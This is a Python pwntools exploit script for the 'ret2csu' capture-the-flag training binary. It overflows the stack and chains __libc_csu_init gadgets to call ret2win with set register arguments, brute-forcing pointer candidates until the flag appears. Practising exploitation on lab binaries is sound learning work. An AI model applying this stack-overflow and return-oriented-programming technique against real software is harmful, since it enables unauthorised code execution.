from pwn import *

elf = ELF("./attachment/ret2csu")
rop = ROP(elf)
lib = ELF("./attachment/libret2csu.so")

# result of `/x ....400000000000` in radare2
dereference_candidates = [
    int(line.split(" ")[0], 16) for line in """0x00600df0 hit1_0 0006400000000000
0x00600df8 hit1_1 d005400000000000
0x00600e38 hit1_2 d004400000000000
0x00600e48 hit1_3 b406400000000000
0x00600e98 hit1_4 9802400000000000
0x00600ea8 hit1_5 c003400000000000
0x00600eb8 hit1_6 d002400000000000
0x00600f28 hit1_7 a004400000000000
0x00600f38 hit1_8 7004400000000000
0x00600f68 hit1_9 5004400000000000
0x00600f88 hit1_10 3a04400000000000
0x00601018 hit1_11 0605400000000000
0x00601020 hit1_12 1605400000000000
0x00400018 hit1_13 2005400000000000
0x00400046 hit1_14 0000400000000000
0x00400050 hit1_15 4000400000000000
0x00400058 hit1_16 4000400000000000
0x00400088 hit1_17 3802400000000000
0x00400090 hit1_18 3802400000000000
0x004000c0 hit1_19 0000400000000000
0x004000c8 hit1_20 0000400000000000
0x00400168 hit1_21 5402400000000000
0x00400170 hit1_22 5402400000000000
0x004001a0 hit1_23 c406400000000000
0x004001a8 hit1_24 c406400000000000
0x00400398 hit1_25 d004400000000000
0x004003b0 hit1_26 b406400000000000""".split("\n")
]

for candidate in dereference_candidates:
    print("[+]", hex(candidate))
    io = process(elf.path, cwd="./attachment", level="DEBUG")
    # pid = gdb.attach(io, gdbscript="b *0x00400510\nb *0x00400680")

    io.recv()

    payload = b"".join([
        b"A" * 40,  # offset
        p64(0x0040069a),  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        p64(0),  # rbx -> r12 + rbx*8
        p64(1),  # rbp for `add rbx, 1; cmp rbp, rbx; jne 0x400680`
        p64(candidate),  # r12 -> r12 + rbx*8
        p64(0),  # r13d -> rdi
        p64(0xcafebabecafebabe),  # r14 -> rsi
        p64(0xd00df00dd00df00d),  # r15 -> rdx
        p64(0x00400680),  # mov rdx, r15; mov rsi, r14; mov rdi, r13d; call qword [r12 + rbx*8]; add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        p64(0),  # for `add rsp, 8`
        p64(0),  # rbx
        p64(0),  # rbp
        p64(0),  # r12
        p64(0),  # r13
        p64(0),  # r14
        p64(0),  # r15
        p64(0x00000000004006a3),  # pop rdi; ret
        p64(0xdeadbeefdeadbeef),  # rdi
        p64(0x00400510),  # ret2win
    ])

    io.sendline(payload)
    result = io.recvall()
    if b"ROPE{" in result:
        print(result)
        break

    io.close()